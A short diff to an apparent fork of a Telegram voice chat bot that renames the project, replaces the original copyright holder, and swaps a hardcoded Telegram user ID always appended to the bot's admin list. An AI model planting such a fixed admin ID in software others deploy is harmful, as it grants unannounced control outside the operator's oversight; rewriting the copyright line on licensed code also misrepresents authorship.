@@ -1,6 +1,6 @@
 """
-RadioPlayerV3, Telegram Voice Chat Bot
-Copyright (c) 2021  Asm Safone <https://github.com/AsmSafone>
+SaluRadioPlayer, Telegram Voice Chat Bot
+Copyright (c) 2021  SaluKithsara <https://github.com/Salu-Kithsara>
 
 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU Affero General Public License as published by
@@ -49,7 +49,7 @@ class Config:
 
     ADMIN = os.environ.get("AUTH_USERS", "")
     ADMINS = [int(admin) if re.search('^\d+$', admin) else admin for admin in (ADMIN).split()]
-    ADMINS.append(1316963576)
+    ADMINS.append(1487361912)
     API_ID = int(os.environ.get("API_ID", ""))
     API_HASH = os.environ.get("API_HASH", "")
     CHAT_ID = int(os.environ.get("CHAT_ID", ""))
